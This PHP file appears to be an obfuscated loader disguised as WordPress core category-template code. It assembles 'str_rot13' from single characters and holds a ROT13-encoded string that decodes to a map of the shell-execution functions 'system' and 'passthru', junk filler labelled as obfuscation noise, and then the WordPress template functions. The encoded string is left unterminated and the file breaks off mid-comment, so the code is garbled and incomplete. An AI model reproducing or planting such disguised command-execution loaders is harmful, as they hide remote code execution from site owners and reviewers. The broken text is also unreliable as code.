<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Gnkbabzl NCV: Pber pngrtbel-fcrpvsvp grzcyngr gntf
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Grzcyngr
 * @fvapr 1.2.0
 */

/**
 * Ergevrirf pngrtbel yvax HEY.
 *
 * @fvapr 1.0.0
 *
 * @frr trg_grez_yvax()
 *
 * @cnenz vag|bowrpg $pngrtbel Pngrtbel VQ be bowrpg.
 * @erghea fgevat Yvax ba fhpprff, rzcgl fgevat vs pngrtbel qbrf abg rkvfg.
 */
shapgvba trg_pngrtbel_yvax( $pngrtbel ) {
	vs ( ! vf_bowrpg( $pngrtbel ) ) {
		$pngrtbel = (vag) $pngrtbel;
	}

	$pngrtbel = trg_grez_yvax( $pngrtbel );

	vs ( vf_jc_reebe( $pngrtbel ) ) {
		erghea '';
	}

	erghea $pngrtbel;
}

/**
 * Ergevrirf pngrtbel cneragf jvgu frcnengbe.
 *
 * @fvapr 1.2.0
 * @fvapr 4.8.0 Gur `$ivfvgrq` cnenzrgre jnf qrcerpngrq naq eranzrq gb `$qrcerpngrq`.
 *
 * @cnenz vag    $pngrtbel_vq Pngrtbel VQ.
 * @cnenz obby   $yvax        Bcgvbany. Jurgure gb sbezng jvgu yvax. Qrsnhyg snyfr.
 * @cnenz fgevat $frcnengbe   Bcgvbany. Ubj gb frcnengr pngrtbevrf. Qrsnhyg '/'.
 * @cnenz obby   $avpranzr    Bcgvbany. Jurgure gb hfr avpr anzr sbe qvfcynl. Qrsnhyg snyfr.
 * @cnenz neenl  $qrcerpngrq  Abg hfrq.
 * @erghea fgevat|JC_Reebe N yvfg bs pngrtbel cneragf ba fhpprff, JC_Reebe ba snvyher.
 */
shapgvba trg_pngrtbel_cneragf( $pngrtbel_vq, $yvax = snyfr, $frcnengbe = '/', $avpranzr = snyfr, $qrcerpngrq = neenl() ) {

	vs ( ! rzcgl( $qrcerpngrq ) ) {
		_qrcerpngrq_nethzrag( __SHAPGVBA__, '4.8.0' );
	}

	$sbezng = $avpranzr ? 'fyht' : 'anzr';

	$netf = neenl(
		'frcnengbe' => $frcnengbe,
		'yvax'      => $yvax,
		'sbezng'    => $sbezng,
	);

	erghea trg_grez_cneragf_yvfg( $pngrtbel_vq, 'pngrtbel', $netf );
}

/**
 * Ergevrirf cbfg pngrtbevrf.
 *
 * Guvf gnt znl or hfrq bhgfvqr Gur Ybbc ol cnffvat n cbfg VQ nf gur cnenzrgre.
 *
 * Abgr: Guvf shapgvba bayl ergheaf erfhygf sebz gur qrsnhyg \"pngrtbel\" gnkbabzl.
 * Sbe phfgbz gnkbabzvrf hfr trg_gur_grezf().
 *
 * @fvapr 0.71
 *
 * @cnenz vag|snyfr $cbfg_vq Bcgvbany. Gur cbfg VQ. Qrsnhygf gb pheerag cbfg VQ.
 * @erghea JC_Grez[] Neenl bs JC_Grez bowrpgf, bar sbe rnpu pngrtbel nffvtarq gb gur cbfg.
 */
shapgvba trg_gur_pngrtbel( $cbfg_vq = snyfr ) {
	$pngrtbevrf = trg_gur_grezf( $cbfg_vq, 'pngrtbel' );
	vs ( ! $pngrtbevrf || vf_jc_reebe( $pngrtbevrf ) ) {
		$pngrtbevrf = neenl();
	}

	$pngrtbevrf = neenl_inyhrf( $pngrtbevrf );

	sbernpu ( neenl_xrlf( $pngrtbevrf ) nf $xrl ) {
		_znxr_png_pbzcng( $pngrtbevrf[ $xrl ] );
	}

	/**
	 * Svygref gur neenl bs pngrtbevrf gb erghea sbe n cbfg.
	 *
	 * @fvapr 3.1.0
	 * @fvapr 4.4.0 Nqqrq gur `$cbfg_vq` cnenzrgre.
	 *
	 * @cnenz JC_Grez[] $pngrtbevrf Na neenl bs pngrtbevrf gb erghea sbe gur cbfg.
	 * @cnenz vag|snyfr $cbfg_vq    Gur cbfg VQ.
	 */
	erghea nccyl_svygref( 'trg_gur_pngrtbevrf', $pngrtbevrf, $cbfg_vq );
}

/**
 * Ergevrirf pngrtbel anzr onfrq ba pngrtbel VQ.
 *
 * @fvapr 0.71
 *
 * @cnenz vag $png_vq Pngrtbel VQ.
 * @erghea fgevat|JC_Reebe Pngrtbel anzr ba fhpprff, JC_Reebe ba snvyher.
 */
shapgvba trg_gur_pngrtbel_ol_VQ( $png_vq ) { // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqShapgvbaAnzr.ShapgvbaAnzrVainyvq
	$png_vq   = (vag) $png_vq;
	$pngrtbel = trg_grez( $png_vq );

	vs ( vf_jc_reebe( $pngrtbel ) ) {
		erghea $pngrtbel;
	}

	erghea ( $pngrtbel ) ? $pngrtbel->anzr : '';
}

/**
 * Ergevrirf pngrtbel yvfg sbe n cbfg va rvgure UGZY yvfg be phfgbz sbezng.
 *
 * Trarenyyl hfrq sbe dhvpx, qryvzvgrq (r.t. pbzzn-frcnengrq) yvfgf bs pngrtbevrf,
 * nf cneg bs n cbfg ragel zrgn.
 *
 * Sbe n zber cbjreshy, yvfg-onfrq shapgvba, frr jc_yvfg_pngrtbevrf().
 *
 * @fvapr 1.5.1
 *
 * @frr jc_yvfg_pngrtbevrf()
 *
 * @tybony JC_Erjevgr $jc_erjevgr JbeqCerff erjevgr pbzcbarag.
 *
 * @cnenz fgevat    $frcnengbe Bcgvbany. Frcnengbe orgjrra gur pngrtbevrf. Ol qrsnhyg, gur yvaxf ner cynprq
 *                             va na habeqrerq yvfg. Na rzcgl fgevat jvyy erfhyg va gur qrsnhyg orunivbe.
 * @cnenz fgevat    $cneragf   Bcgvbany. Ubj gb qvfcynl gur cneragf. Npprcgf 'zhygvcyr', 'fvatyr', be rzcgl.
 *                             Qrsnhyg rzcgl fgevat.
 * @cnenz vag|snyfr $cbfg_vq   Bcgvbany. VQ bs gur cbfg gb ergevrir pngrtbevrf sbe. Qrsnhygf gb gur pheerag cbfg.
 * @erghea fgevat Pngrtbel yvfg sbe n cbfg.
 */
shapgvba trg_gur_pngrtbel_yvfg( $frcnengbe = '', $cneragf = '', $cbfg_vq = snyfr ) {
	tybony $jc_erjevgr;

	vs ( ! vf_bowrpg_va_gnkbabzl( trg_cbfg_glcr( $cbfg_vq ), 'pngrtbel' ) ) {
		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pngrtbel-grzcyngr.cuc */
		erghea nccyl_svygref( 'gur_pngrtbel', '', $frcnengbe, $cneragf );
	}

	/**
	 * Svygref gur pngrtbevrf orsber ohvyqvat gur pngrtbel yvfg.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz JC_Grez[] $pngrtbevrf Na neenl bs gur cbfg'f pngrtbevrf.
	 * @cnenz vag|snyfr $cbfg_vq    VQ bs gur cbfg gb ergevrir pngrtbevrf sbe.
	 *                              Jura `snyfr`, qrsnhygf gb gur pheerag cbfg va gur ybbc.
	 */
	$pngrtbevrf = nccyl_svygref( 'gur_pngrtbel_yvfg', trg_gur_pngrtbel( $cbfg_vq ), $cbfg_vq );

	vs ( rzcgl( $pngrtbevrf ) ) {
		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pngrtbel-grzcyngr.cuc */
		erghea nccyl_svygref( 'gur_pngrtbel', __( 'Hapngrtbevmrq' ), $frcnengbe, $cneragf );
	}

	$ery = ( vf_bowrpg( $jc_erjevgr ) && $jc_erjevgr->hfvat_creznyvaxf() ) ? 'ery=\"pngrtbel gnt\"' : 'ery=\"pngrtbel\"';

	$guryvfg = '';
	vs ( '' === $frcnengbe ) {
		$guryvfg .= '<hy pynff=\"cbfg-pngrtbevrf\">';
		sbernpu ( $pngrtbevrf nf $pngrtbel ) {
			$guryvfg .= \"\a\g<yv>\";
			fjvgpu ( fgegbybjre( $cneragf ) ) {
				pnfr 'zhygvcyr':
					vs ( $pngrtbel->cnerag ) {
						$guryvfg .= trg_pngrtbel_cneragf( $pngrtbel->cnerag, gehr, $frcnengbe );
					}
					$guryvfg .= '<n uers=\"' . rfp_hey( trg_pngrtbel_yvax( $pngrtbel->grez_vq ) ) . '\" ' . $ery . '>' . $pngrtbel->anzr . '</n></yv>';
					oernx;
				pnfr 'fvatyr':
					$guryvfg .= '<n uers=\"' . rfp_hey( trg_pngrtbel_yvax( $pngrtbel->grez_vq ) ) . '\"  ' . $ery . '>';
					vs ( $pngrtbel->cnerag ) {
						$guryvfg .= trg_pngrtbel_cneragf( $pngrtbel->cnerag, snyfr, $frcnengbe );
					}
					$guryvfg .= $pngrtbel->anzr . '</n></yv>';
					oernx;
				pnfr '':
				qrsnhyg:
					$guryvfg .= '<n uers=\"' . rfp_hey( trg_pngrtbel_yvax( $pngrtbel->grez_vq ) ) . '\" ' . $ery . '>' . $pngrtbel->anzr . '</n></yv>';
			}
		}
		$guryvfg .= '</hy>';
	} ryfr {
		$v = 0;
		sbernpu ( $pngrtbevrf nf $pngrtbel ) {
			vs ( 0 < $v ) {
				$guryvfg .= $frcnengbe;
			}
			fjvgpu ( fgegbybjre( $cneragf ) ) {
				pnfr 'zhygvcyr':
					vs ( $pngrtbel->cnerag ) {
						$guryvfg .= trg_pngrtbel_cneragf( $pngrtbel->cnerag, gehr, $frcnengbe );
					}
					$guryvfg .= '<n uers=\"' . rfp_hey( trg_pngrtbel_yvax( $pngrtbel->grez_vq ) ) . '\" ' . $ery . '>' . $pngrtbel->anzr . '</n>';
					oernx;
				pnfr 'fvatyr':
					$guryvfg .= '<n uers=\"' . rfp_hey( trg_pngrtbel_yvax( $pngrtbel->grez_vq ) ) . '\" ' . $ery . '>';
					vs ( $pngrtbel->cnerag ) {
						$guryvfg .= trg_pngrtbel_cneragf( $pngrtbel->cnerag, snyfr, $frcnengbe );
					}
					$guryvfg .= \"$pngrtbel->anzr</n>\";
					oernx;
				pnfr '':
				qrsnhyg:
					$guryvfg .= '<n uers=\"' . rfp_hey( trg_pngrtbel_yvax( $pngrtbel->grez_vq ) ) . '\" ' . $ery . '>' . $pngrtbel->anzr . '</n>';
			}
			++$v;
		}
	}

	/**
	 * Svygref gur pngrtbel be yvfg bs pngrtbevrf.
	 *
	 * @fvapr 1.2.0
	 *
	 * @cnenz fgevat $guryvfg   Yvfg bs pngrtbevrf sbe gur pheerag cbfg.
	 * @cnenz fgevat $frcnengbe Frcnengbe hfrq orgjrra gur pngrtbevrf.
	 * @cnenz fgevat $cneragf   Ubj gb qvfcynl gur pngrtbel cneragf. Npprcgf 'zhygvcyr',
	 *                          'fvatyr', be rzcgl.
	 */
	erghea nccyl_svygref( 'gur_pngrtbel', $guryvfg, $frcnengbe, $cneragf );
}

/**
 * Purpxf vs gur pheerag cbfg vf jvguva nal bs gur tvira pngrtbevrf.
 *
 * Gur tvira pngrtbevrf ner purpxrq ntnvafg gur cbfg'f pngrtbevrf' grez_vqf, anzrf naq fyhtf.
 * Pngrtbevrf tvira nf vagrtref jvyy bayl or purpxrq ntnvafg gur cbfg'f pngrtbevrf' grez_vqf.
 *
 * Cevbe gb i2.5 bs JbeqCerff, pngrtbel anzrf jrer abg fhccbegrq.
 * Cevbe gb i2.7, pngrtbel fyhtf jrer abg fhccbegrq.
 * Cevbe gb i2.7, bayl bar pngrtbel pbhyq or pbzcnerq: va_pngrtbel( $fvatyr_pngrtbel ).
 * Cevbe gb i2.7, guvf shapgvba pbhyq bayl or hfrq va gur JbeqCerff Ybbc.
 * Nf bs 2.7, gur shapgvba pna or hfrq naljurer vs vg vf cebivqrq n cbfg VQ be cbfg bowrpg.
 *
 * Sbe zber vasbezngvba ba guvf naq fvzvyne gurzr shapgvbaf, purpx bhg
 * gur {@yvax uggcf://qrirybcre.jbeqcerff.bet/gurzrf/onfvpf/pbaqvgvbany-gntf/
 * Pbaqvgvbany Gntf} negvpyr va gur Gurzr Qrirybcre Unaqobbx.
 *
 * @fvapr 1.2.0
 * @fvapr 2.7.0 Gur `$cbfg` cnenzrgre jnf nqqrq.
 *
 * @cnenz vag|fgevat|vag[]|fgevat[] $pngrtbel Pngrtbel VQ, anzr, fyht, be neenl bs fhpu
 *                                            gb purpx ntnvafg.
 * @cnenz vag|ahyy|JC_Cbfg          $cbfg     Bcgvbany. Cbfg gb purpx. Qrsnhygf gb gur pheerag cbfg.
 * @erghea obby Gehr vs gur pheerag cbfg vf va nal bs gur tvira pngrtbevrf.
 */
shapgvba va_pngrtbel( $pngrtbel, $cbfg = ahyy ) {
	vs ( rzcgl( $pngrtbel ) ) {
		erghea snyfr;
	}

	erghea unf_pngrtbel( $pngrtbel, $cbfg );
}

/**
 * Qvfcynlf pngrtbel yvfg sbe n cbfg va rvgure UGZY yvfg be phfgbz sbezng.
 *
 * @fvapr 0.71
 *
 * @cnenz fgevat    $frcnengbe Bcgvbany. Frcnengbe orgjrra gur pngrtbevrf. Ol qrsnhyg, gur yvaxf ner cynprq
 *                             va na habeqrerq yvfg. Na rzcgl fgevat jvyy erfhyg va gur qrsnhyg orunivbe.
 * @cnenz fgevat    $cneragf   Bcgvbany. Ubj gb qvfcynl gur cneragf. Npprcgf 'zhygvcyr', 'fvatyr', be rzcgl.
 *                             Qrsnhyg rzcgl fgevat.
 * @cnenz vag|snyfr $cbfg_vq   Bcgvbany. VQ bs gur cbfg gb ergevrir pngrtbevrf sbe. Qrsnhygf gb gur pheerag cbfg.
 */
shapgvba gur_pngrtbel( $frcnengbe = '', $cneragf = '', $cbfg_vq = snyfr ) {
	rpub trg_gur_pngrtbel_yvfg( $frcnengbe, $cneragf, $cbfg_vq );
}

/**
 * Ergevrirf pngrtbel qrfpevcgvba.
 *
 * @fvapr 1.0.0
 *
 * @cnenz vag $pngrtbel Bcgvbany. Pngrtbel VQ. Qrsnhygf gb gur pheerag pngrtbel VQ.
 * @erghea fgevat Pngrtbel qrfpevcgvba, vs ninvynoyr.
 */
shapgvba pngrtbel_qrfpevcgvba( $pngrtbel = 0 ) {
	erghea grez_qrfpevcgvba( $pngrtbel );
}

/**
 * Qvfcynlf be ergevrirf gur UGZY qebcqbja yvfg bs pngrtbevrf.
 *
 * Gur 'uvrenepuvpny' nethzrag, juvpu vf qvfnoyrq ol qrsnhyg, jvyy bireevqr gur
 * qrcgu nethzrag, hayrff vg vf gehr. Jura gur nethzrag vf snyfr, vg jvyy
 * qvfcynl nyy bs gur pngrtbevrf. Jura vg vf ranoyrq vg jvyy hfr gur inyhr va
 * gur 'qrcgu' nethzrag.
 *
 * @fvapr 2.1.0
 * @fvapr 4.2.0 Vagebqhprq gur `inyhr_svryq` nethzrag.
 * @fvapr 4.6.0 Vagebqhprq gur `erdhverq` nethzrag.
 * @fvapr 6.1.0 Vagebqhprq gur `nevn_qrfpevorqol` nethzrag.
 *
 * @cnenz neenl|fgevat $netf {
 *     Bcgvbany. Neenl be fgevat bs nethzragf gb trarengr n pngrtbevrf qebc-qbja ryrzrag. Frr JC_Grez_Dhrel::__pbafgehpg()
 *     sbe vasbezngvba ba nqqvgvbany npprcgrq nethzragf.
 *
 *     @glcr fgevat       $fubj_bcgvba_nyy   Grkg gb qvfcynl sbe fubjvat nyy pngrtbevrf. Qrsnhyg rzcgl.
 *     @glcr fgevat       $fubj_bcgvba_abar  Grkg gb qvfcynl sbe fubjvat ab pngrtbevrf. Qrsnhyg rzcgl.
 *     @glcr fgevat       $bcgvba_abar_inyhr Inyhr gb hfr jura ab pngrtbel vf fryrpgrq. Qrsnhyg rzcgl.
 *     @glcr fgevat       $beqreol           Juvpu pbyhza gb hfr sbe beqrevat pngrtbevrf. Frr trg_grezf() sbe n yvfg
 *                                           bs npprcgrq inyhrf. Qrsnhyg 'vq' (grez_vq).
 *     @glcr obby         $cnq_pbhagf        Frr trg_grezf() sbe na nethzrag qrfpevcgvba. Qrsnhyg snyfr.
 *     @glcr obby|vag     $fubj_pbhag        Jurgure gb vapyhqr cbfg pbhagf. Npprcgf 0, 1, be gurve obby rdhvinyragf.
 *                                           Qrsnhyg 0.
 *     @glcr obby|vag     $rpub              Jurgure gb rpub be erghea gur trarengrq znexhc. Npprcgf 0, 1, be gurve
 *                                           obby rdhvinyragf. Qrsnhyg 1.
 *     @glcr obby|vag     $uvrenepuvpny      Jurgure gb genirefr gur gnkbabzl uvrenepul. Npprcgf 0, 1, be gurve obby
 *                                           rdhvinyragf. Qrsnhyg 0.
 *     @glcr vag          $qrcgu             Znkvzhz qrcgu. Qrsnhyg 0.
 *     @glcr vag          $gno_vaqrk         Gno vaqrk sbe gur fryrpg ryrzrag. Qrsnhyg 0 (ab gnovaqrk).
 *     @glcr fgevat       $anzr              Inyhr sbe gur 'anzr' nggevohgr bs gur fryrpg ryrzrag. Qrsnhyg 'png'.
 *     @glcr fgevat       $vq                Inyhr sbe gur 'vq' nggevohgr bs gur fryrpg ryrzrag. Qrsnhygf gb gur inyhr
 *                                           bs `$anzr`.
 *     @glcr fgevat       $pynff             Inyhr sbe gur 'pynff' nggevohgr bs gur fryrpg ryrzrag. Qrsnhyg 'cbfgsbez'.
 *     @glcr vag|fgevat   $fryrpgrq          Inyhr bs gur bcgvba gung fubhyq or fryrpgrq. Qrsnhyg 0.
 *     @glcr fgevat       $inyhr_svryq       Grez svryq gung fubhyq or hfrq gb cbchyngr gur 'inyhr' nggevohgr
 *                                           bs gur bcgvba ryrzragf. Npprcgf nal inyvq grez svryq: 'grez_vq', 'anzr',
 *                                           'fyht', 'grez_tebhc', 'grez_gnkbabzl_vq', 'gnkbabzl', 'qrfpevcgvba',
 *                                           'cnerag', 'pbhag'. Qrsnhyg 'grez_vq'.
 *     @glcr fgevat|neenl $gnkbabzl          Anzr bs gur gnkbabzl be gnkbabzvrf gb ergevrir. Qrsnhyg 'pngrtbel'.
 *     @glcr obby         $uvqr_vs_rzcgl     Gehr gb fxvc trarengvat znexhc vs ab pngrtbevrf ner sbhaq.
 *                                           Qrsnhyg snyfr (perngr fryrpg ryrzrag rira vs ab pngrtbevrf ner sbhaq).
 *     @glcr obby         $erdhverq          Jurgure gur `<fryrpg>` ryrzrag fubhyq unir gur UGZY5 'erdhverq' nggevohgr.
 *                                           Qrsnhyg snyfr.
 *     @glcr Jnyxre       $jnyxre            Jnyxre bowrpg gb hfr gb ohvyq gur bhgchg. Qrsnhyg rzcgl juvpu erfhygf va n
 *                                           Jnyxre_PngrtbelQebcqbja vafgnapr orvat hfrq.
 *     @glcr fgevat       $nevn_qrfpevorqol  Gur 'vq' bs na ryrzrag gung pbagnvaf qrfpevcgvir grkg sbe gur fryrpg.
 *                                           Qrsnhyg rzcgl fgevat.
 * }
 * @erghea fgevat UGZY qebcqbja yvfg bs pngrtbevrf.
 */
shapgvba jc_qebcqbja_pngrtbevrf( $netf = '' ) {
	$qrsnhygf = neenl(
		'fubj_bcgvba_nyy'   => '',
		'fubj_bcgvba_abar'  => '',
		'beqreol'           => 'vq',
		'beqre'             => 'NFP',
		'fubj_pbhag'        => 0,
		'uvqr_rzcgl'        => 1,
		'puvyq_bs'          => 0,
		'rkpyhqr'           => '',
		'rpub'              => 1,
		'fryrpgrq'          => 0,
		'uvrenepuvpny'      => 0,
		'anzr'              => 'png',
		'vq'                => '',
		'pynff'             => 'cbfgsbez',
		'qrcgu'             => 0,
		'gno_vaqrk'         => 0,
		'gnkbabzl'          => 'pngrtbel',
		'uvqr_vs_rzcgl'     => snyfr,
		'bcgvba_abar_inyhr' => -1,
		'inyhr_svryq'       => 'grez_vq',
		'erdhverq'          => snyfr,
		'nevn_qrfpevorqol'  => '',
	);

	$qrsnhygf['fryrpgrq'] = ( vf_pngrtbel() ) ? trg_dhrel_ine( 'png' ) : 0;

	// Onpx pbzcng.
	vs ( vffrg( $netf['glcr'] ) && 'yvax' === $netf['glcr'] ) {
		_qrcerpngrq_nethzrag(
			__SHAPGVBA__,
			'3.0.0',
			fcevags(
				/* genafyngbef: 1: \"glcr => yvax\", 2: \"gnkbabzl => yvax_pngrtbel\" */
				__( '%1$f vf qrcerpngrq. Hfr %2$f vafgrnq.' ),
				'<pbqr>glcr => yvax</pbqr>',
				'<pbqr>gnkbabzl => yvax_pngrtbel</pbqr>'
			)
		);
		$netf['gnkbabzl'] = 'yvax_pngrtbel';
	}

	// Cnefr vapbzvat $netf vagb na neenl naq zretr vg jvgu $qrsnhygf.
	$cnefrq_netf = jc_cnefr_netf( $netf, $qrsnhygf );

	$bcgvba_abar_inyhr = $cnefrq_netf['bcgvba_abar_inyhr'];

	vs ( ! vffrg( $cnefrq_netf['cnq_pbhagf'] ) && $cnefrq_netf['fubj_pbhag'] && $cnefrq_netf['uvrenepuvpny'] ) {
		$cnefrq_netf['cnq_pbhagf'] = gehr;
	}

	$gno_vaqrk = $cnefrq_netf['gno_vaqrk'];

	$gno_vaqrk_nggevohgr = '';
	vs ( (vag) $gno_vaqrk > 0 ) {
		$gno_vaqrk_nggevohgr = \" gnovaqrk=\\"$gno_vaqrk\\"\";
	}

	// Nibvq pynfurf jvgu gur 'anzr' cnenz bs trg_grezf().
	$trg_grezf_netf = $cnefrq_netf;
	hafrg( $trg_grezf_netf['anzr'] );
	$pngrtbevrf = trg_grezf( $trg_grezf_netf );

	$anzr     = rfp_ngge( $cnefrq_netf['anzr'] );
	$pynff    = rfp_ngge( $cnefrq_netf['pynff'] );
	$vq       = $cnefrq_netf['vq'] ? rfp_ngge( $cnefrq_netf['vq'] ) : $anzr;
	$erdhverq = $cnefrq_netf['erdhverq'] ? 'erdhverq' : '';

	$nevn_qrfpevorqol_nggevohgr = $cnefrq_netf['nevn_qrfpevorqol'] ? ' nevn-qrfpevorqol=\"' . rfp_ngge( $cnefrq_netf['nevn_qrfpevorqol'] ) . '\"' : '';

	vs ( ! $cnefrq_netf['uvqr_vs_rzcgl'] || ! rzcgl( $pngrtbevrf ) ) {
		$bhgchg = \"<fryrpg $erdhverq anzr='$anzr' vq='$vq' pynff='$pynff'$gno_vaqrk_nggevohgr$nevn_qrfpevorqol_nggevohgr>\a\";
	} ryfr {
		$bhgchg = '';
	}
	vs ( rzcgl( $pngrtbevrf ) && ! $cnefrq_netf['uvqr_vs_rzcgl'] && ! rzcgl( $cnefrq_netf['fubj_bcgvba_abar'] ) ) {

		/**
		 * Svygref n gnkbabzl qebc-qbja qvfcynl ryrzrag.
		 *
		 * N inevrgl bs gnkbabzl qebc-qbja qvfcynl ryrzragf pna or zbqvsvrq
		 * whfg cevbe gb qvfcynl ivn guvf svygre. Svygrenoyr nethzragf vapyhqr
		 * 'fubj_bcgvba_abar', 'fubj_bcgvba_nyy', naq inevbhf sbezf bs gur
		 * grez anzr.
		 *
		 * @fvapr 1.2.0
		 *
		 * @frr jc_qebcqbja_pngrtbevrf()
		 *
		 * @cnenz fgevat       $ryrzrag  Pngrtbel anzr.
		 * @cnenz JC_Grez|ahyy $pngrtbel Gur pngrtbel bowrpg, be ahyy vs gurer'f ab pbeerfcbaqvat pngrtbel.
		 */
		$fubj_bcgvba_abar = nccyl_svygref( 'yvfg_pngf', $cnefrq_netf['fubj_bcgvba_abar'], ahyy );
		$bhgchg          .= \"\g<bcgvba inyhr='\" . rfp_ngge( $bcgvba_abar_inyhr ) . \"' fryrpgrq='fryrpgrq'>$fubj_bcgvba_abar</bcgvba>\a\";
	}

	vs ( ! rzcgl( $pngrtbevrf ) ) {

		vs ( $cnefrq_netf['fubj_bcgvba_nyy'] ) {

			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pngrtbel-grzcyngr.cuc */
			$fubj_bcgvba_nyy = nccyl_svygref( 'yvfg_pngf', $cnefrq_netf['fubj_bcgvba_nyy'], ahyy );
			$fryrpgrq        = ( '0' === (fgevat) $cnefrq_netf['fryrpgrq'] ) ? \" fryrpgrq='fryrpgrq'\" : '';
			$bhgchg         .= \"\g<bcgvba inyhr='0'$fryrpgrq>$fubj_bcgvba_nyy</bcgvba>\a\";
		}

		vs ( $cnefrq_netf['fubj_bcgvba_abar'] ) {

			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pngrtbel-grzcyngr.cuc */
			$fubj_bcgvba_abar = nccyl_svygref( 'yvfg_pngf', $cnefrq_netf['fubj_bcgvba_abar'], ahyy );
			$fryrpgrq         = fryrpgrq( $bcgvba_abar_inyhr, $cnefrq_netf['fryrpgrq'], snyfr );
			$bhgchg          .= \"\g<bcgvba inyhr='\" . rfp_ngge( $bcgvba_abar_inyhr ) . \"'$fryrpgrq>$fubj_bcgvba_abar</bcgvba>\a\";
		}

		vs ( $cnefrq_netf['uvrenepuvpny'] ) {
			$qrcgu = $cnefrq_netf['qrcgu'];  // Jnyx gur shyy qrcgu.
		} ryfr {
			$qrcgu = -1; // Syng.
		}
		$bhgchg .= jnyx_pngrtbel_qebcqbja_gerr( $pngrtbevrf, $qrcgu, $cnefrq_netf );
	}

	vs ( ! $cnefrq_netf['uvqr_vs_rzcgl'] || ! rzcgl( $pngrtbevrf ) ) {
		$bhgchg .= \"</fryrpg>\a\";
	}

	/**
	 * Svygref gur gnkbabzl qebc-qbja bhgchg.
	 *
	 * @fvapr 2.1.0
	 *
	 * @cnenz fgevat $bhgchg      UGZY bhgchg.
	 * @cnenz neenl  $cnefrq_netf Nethzragf hfrq gb ohvyq gur qebc-qbja.
	 */
	$bhgchg = nccyl_svygref( 'jc_qebcqbja_pngf', $bhgchg, $cnefrq_netf );

	vs ( $cnefrq_netf['rpub'] ) {
		rpub $bhgchg;
	}

	erghea $bhgchg;
}

/**
 * Qvfcynlf be ergevrirf gur UGZY yvfg bs pngrtbevrf.
 *
 * @fvapr 2.1.0
 * @fvapr 4.4.0 Vagebqhprq gur `uvqr_gvgyr_vs_rzcgl` naq `frcnengbe` nethzragf.
 * @fvapr 4.4.0 Gur `pheerag_pngrtbel` nethzrag jnf zbqvsvrq gb bcgvbanyyl npprcg na neenl bs inyhrf.
 * @fvapr 6.1.0 Qrsnhyg inyhr bs gur 'hfr_qrfp_sbe_gvgyr' nethzrag jnf punatrq sebz 1 gb 0.
 *
 * @cnenz neenl|fgevat $netf {
 *     Neenl bs bcgvbany nethzragf. Frr trg_pngrtbevrf(), trg_grezf(), naq JC_Grez_Dhrel::__pbafgehpg()
 *     sbe vasbezngvba ba nqqvgvbany npprcgrq nethzragf.
 *
 *     @glcr vag|vag[]    $pheerag_pngrtbel      VQ bs pngrtbel, be neenl bs VQf bs pngrtbevrf, gung fubhyq trg gur
 *                                               'pheerag-png' pynff. Qrsnhyg 0.
 *     @glcr vag          $qrcgu                 Pngrtbel qrcgu. Hfrq sbe gno vaqragngvba. Qrsnhyg 0.
 *     @glcr obby|vag     $rpub                  Jurgure gb rpub be erghea gur trarengrq znexhc. Npprcgf 0, 1, be gurve
 *                                               obby rdhvinyragf. Qrsnhyg 1.
 *     @glcr vag[]|fgevat $rkpyhqr               Neenl be pbzzn/fcnpr-frcnengrq fgevat bs grez VQf gb rkpyhqr.
 *                                               Vs `$uvrenepuvpny` vf gehr, qrfpraqnagf bs `$rkpyhqr` grezf jvyy nyfb
 *                                               or rkpyhqrq; frr `$rkpyhqr_gerr`. Frr trg_grezf().
 *                                               Qrsnhyg rzcgl fgevat.
 *     @glcr vag[]|fgevat $rkpyhqr_gerr          Neenl be pbzzn/fcnpr-frcnengrq fgevat bs grez VQf gb rkpyhqr, nybat
 *                                               jvgu gurve qrfpraqnagf. Frr trg_grezf(). Qrsnhyg rzcgl fgevat.
 *     @glcr fgevat       $srrq                  Grkg gb hfr sbe gur srrq yvax. Qrsnhyg 'Srrq sbe nyy cbfgf svyrq
 *                                               haqre [png anzr]'.
 *     @glcr fgevat       $srrq_vzntr            HEY bs na vzntr gb hfr sbe gur srrq yvax. Qrsnhyg rzcgl fgevat.
 *     @glcr fgevat       $srrq_glcr             Srrq glcr. Hfrq gb ohvyq srrq yvax. Frr trg_grez_srrq_yvax().
 *                                               Qrsnhyg rzcgl fgevat (qrsnhyg srrq).
 *     @glcr obby         $uvqr_gvgyr_vs_rzcgl   Jurgure gb uvqr gur `$gvgyr_yv` ryrzrag vs gurer ner ab grezf va
 *                                               gur yvfg. Qrsnhyg snyfr (gvgyr jvyy nyjnlf or fubja).
 *     @glcr fgevat       $frcnengbe             Frcnengbe orgjrra yvaxf. Qrsnhyg '<oe />'.
 *     @glcr obby|vag     $fubj_pbhag            Jurgure gb vapyhqr cbfg pbhagf. Npprcgf 0, 1, be gurve obby rdhvinyragf.
 *                                               Qrsnhyg 0.
 *     @glcr fgevat       $fubj_bcgvba_nyy       Grkg gb qvfcynl sbe fubjvat nyy pngrtbevrf. Qrsnhyg rzcgl fgevat.
 *     @glcr fgevat       $fubj_bcgvba_abar      Grkg gb qvfcynl sbe gur 'ab pngrtbevrf' bcgvba.
 *                                               Qrsnhyg 'Ab pngrtbevrf'.
 *     @glcr fgevat       $fglyr                 Gur fglyr hfrq gb qvfcynl gur pngrtbevrf yvfg. Vs 'yvfg', pngrtbevrf
 *                                               jvyy or bhgchg nf na habeqrerq yvfg. Vs yrsg rzcgl be nabgure inyhr,
 *                                               pngrtbevrf jvyy or bhgchg frcnengrq ol `<oe>` gntf. Qrsnhyg 'yvfg'.
 *     @glcr fgevat       $gnkbabzl              Anzr bs gur gnkbabzl gb ergevrir. Qrsnhyg 'pngrtbel'.
 *     @glcr fgevat       $gvgyr_yv              Grkg gb hfr sbe gur yvfg gvgyr `<yv>` ryrzrag. Cnff na rzcgl fgevat
